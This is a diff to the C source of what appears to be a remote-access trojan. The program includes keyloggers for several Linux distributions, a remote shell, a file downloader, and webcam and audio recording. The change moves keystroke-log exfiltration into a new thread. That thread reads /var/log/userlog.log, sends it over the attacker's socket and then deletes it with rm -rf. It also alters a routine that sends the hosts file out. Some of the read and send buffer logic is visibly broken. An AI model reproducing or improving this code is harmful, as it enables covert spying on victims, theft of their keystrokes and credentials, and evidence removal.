@@ -24,7 +24,7 @@ static SOCKET csock = 0;
 
 static int on_video = -1;
 
-int main(int argc, char*argv[])
+int main(int argc, char *argv[])
 {
     /** Make hodin_daemon.sh script executable **/
     if(system("chmod +x script/hodin_daemon.sh") == -1)
@@ -75,8 +75,6 @@ int main(int argc, char*argv[])
         return 0;
     }
 
-    //daemonize();
-
     //ubuntu16_keylogger_init();
 
     ubuntu18_keylogger_init();
@@ -88,6 +86,11 @@ int main(int argc, char*argv[])
     //kali_keylogger_init();
 
     //fedora_keylogger_init();
+    
+    
+    
+    //daemonize();
+    
 
     /* Initialize GStreamer */
     gst_init(&argc, &argv);
@@ -108,22 +111,12 @@ void dispatch_modules(char *argv[])
     int option = 1;
     size_t flag = 0;
 
-    FILE *log_file = NULL;
-
-    long dataSend = 0;
-    long dataRead = 0;
-    long totalSend = 0;
-    long file_size = 0;
-    int caractereLu = 0;
-    int i = 0;
-
-    char buffer[BUFSIZ] = "";
-
     pthread_t thread_remote_shell = 0;
     pthread_t thread_downloader = 0;
     pthread_t thread_hosts_downloader = 0;
+    pthread_t thread_log_keylogger = 0;
 
-    //pthread_t stream_desktop = 0;
+    pthread_t stream_desktop = 0;
     pthread_t stream_webcam_thread = 0;
     pthread_t record_webcam_thread = 0;
     pthread_t record_audio_thread = 0;
@@ -241,72 +234,22 @@ void dispatch_modules(char *argv[])
             printf("\t\tSTARTING FEDORA 28 KEYLOGGER ....\n");
             fedora_keylogger_init();
         }
-
+                      
         if(flag == 6)
         {
-            printf("\t\tSENDING LOG FILE ....\n");
+            printf("\t\tSENDING LOGGER LOG FOR DOWNLOAD ....\n");
 
-            log_file = fopen("/var/log/userlog.log", "r+");
-            if(log_file == NULL)
+            if(pthread_create(&thread_log_keylogger, NULL, (void*(*)(void*))send_logger_log, NULL) == -1)
             {
-                error("fopen() log_file", "dispatch_modules()");
+                error("pthread_create() thread_log_keylogger", "dispatch_modules()");
                 return;
             }
 
-            while((caractereLu = fgetc(log_file)) != EOF)
+            if(pthread_join(thread_log_keylogger, NULL) != 0)
             {
-                buffer[i] = (char)caractereLu;
-                i++;
-            }
-
-            fseek(log_file, 0, SEEK_END);
-            file_size = ftell(log_file);
-            rewind(log_file);
-
-            /** Envoie de la taille du fichier txt **/
-            if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
-            {
-                error("send() file_size", "dispatch_modules()");
-                return;
-
-            }
-
-            printf("Weight of the file send with success : %ld octets\n", file_size);
-
-            do
-            {
-                dataRead = fread(buffer, sizeof(char), sizeof(file_size), log_file);
-                if(dataRead < 0)
-                {
-                    perror("fread ");
-                    return;
-                }
-
-                dataSend = send(csock, buffer, file_size, 0);
-
-                //printf("Envoie de %ld octets\n", dataSend);
-
-                if(dataSend < 0)
-                {
-                    perror("send() ");
-                    exit(errno);
-                }
-
-                totalSend += dataSend;
-
-            }while(totalSend < file_size);
-
-            printf("File totaly send with success : %ld\n", totalSend);
-
-            fclose(log_file);
-
-            if(system("rm -rf /var/log/userlog.log") == -1)
-            {
-                error("system() userlog.log", "dispatch_modules()");
+                perror("pthread_join");
                 return;
             }
-
-            //close(csock);
         }
 
         if(flag == 7)
@@ -410,21 +353,17 @@ void dispatch_modules(char *argv[])
                 return;
             }
         }
-
-
-        /**
+        /*
         if(flag == 13)
         {
             printf("\t\tSTREAMING STARTED....\n");
-
-             Call the thread that will execute the stream command
-            if(pthread_create(&stream_desktop, NULL, (void*(*)(void*)execute_cmd, NULL) == -1)
+            
+            if(pthread_create(&stream_desktop, NULL, (void*(*)(void*))execute_cmd, NULL) == -1)
             {
                 error("pthread_create() execute_cmd", "dispatch_modules()");
                 exit(-1);
             }
-
-            if (pthread_join(stream_desktop, NULL) != 0)
+             
             if (pthread_join(stream_desktop, NULL) != 0)
             {
                 perror("pthread_join");
@@ -433,7 +372,8 @@ void dispatch_modules(char *argv[])
             }
 
         }
-        **/
+         */ 
+        
 
         if(flag == 14)
         {
@@ -502,6 +442,85 @@ void dispatch_modules(char *argv[])
     }
 
     return;
+}
+
+
+
+void *send_logger_log()
+{
+    long dataSend = 0;
+    long dataRead = 0;
+    long totalSend = 0;
+    long file_size = 0;
+    int caractereLu = 0;
+    
+    FILE *log_file = NULL;
+    char buffer[BUFSIZ] = "";
+    int log_empty = 0;
+    
+     int i = 0;
+ 
+    log_file = fopen("/var/log/userlog.log", "r+");
+    if(log_file == NULL)
+    { 
+        error("fopen() log_file", "dispatch_modules()");
+        pthread_exit(NULL);
+    }
+  
+    while((caractereLu = fgetc(log_file)) != EOF)
+    {
+        buffer[i] = (char)caractereLu;
+        i++;
+    }
+
+    fseek(log_file, 0, SEEK_END);
+    file_size = ftell(log_file);
+    rewind(log_file);
+
+    /** Envoie de la taille du fichier txt **/
+    if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
+    {
+        error("send() file_size", "dispatch_modules()");
+        pthread_exit(NULL);
+
+    }
+
+    printf("Weight of the file send with success : %ld octets\n", file_size);
+
+    do
+    {
+        dataRead = fread(buffer, sizeof(char), sizeof(file_size), log_file);
+        if(dataRead < 0)
+        {
+            perror("fread ");
+            pthread_exit(NULL);
+        }
+
+        dataSend = send(csock, buffer, file_size, 0);
+
+        //printf("Envoie de %ld octets\n", dataSend);
+
+        if(dataSend < 0)
+        {
+            perror("send() ");
+            pthread_exit(NULL);
+        }
+
+        totalSend += dataSend;
+
+    }while(totalSend < file_size);
+
+    printf("File totaly send with success : %ld\n", totalSend);
+  
+    if(system("rm -rf /var/log/userlog.log") == -1)
+    {
+        error("system() userlog.log", "dispatch_modules()");
+        pthread_exit(NULL);
+    }
+    
+    fclose(log_file);
+    
+    pthread_exit(NULL);  
 }
 
 
@@ -593,6 +612,8 @@ void recv_upload()
         totalRcv += tailleBlockRecut;
 
     }while(totalRcv < weight);
+    
+    printf("fichier reçut success : %ld\n", totalRcv);
 
 
     pipe[0] = popen(cmd_1, "r");
@@ -852,7 +873,7 @@ void *send_hosts_file()
 
     FILE *hosts_download = NULL;
 
-    char buffer[BUFSIZ] = "";
+    char buffer[MAXDATASIZE] = "";
 
     long dataSend = 0;
     long dataRead = 0;
@@ -897,14 +918,14 @@ void *send_hosts_file()
 
     do
     {
-        dataRead = fread(buffer, sizeof(char), file_size, hosts_download);
+        dataRead = fread(buffer, sizeof(char), sizeof(file_size), hosts_download);
         if(dataRead < 0)
         {
             perror("fread ");
             return 0;
         }
 
-        dataSend = send(csock, buffer, file_size, 0);
+        dataSend = send(csock, buffer, sizeof(file_size), 0);
 
         //printf("Envoie de %ld octets\n", dataSend);
 
@@ -1118,7 +1139,7 @@ void *execute_record_cmd()
     FILE *record_file = NULL;
     long file_weight = 0;
 
-    unsigned char buffer_record[1450] = "";
+    char buffer_record[BUFSIZ] = "";
     long dataSend = 0;
     long dataRead = 0;
     long totalSend = 0;
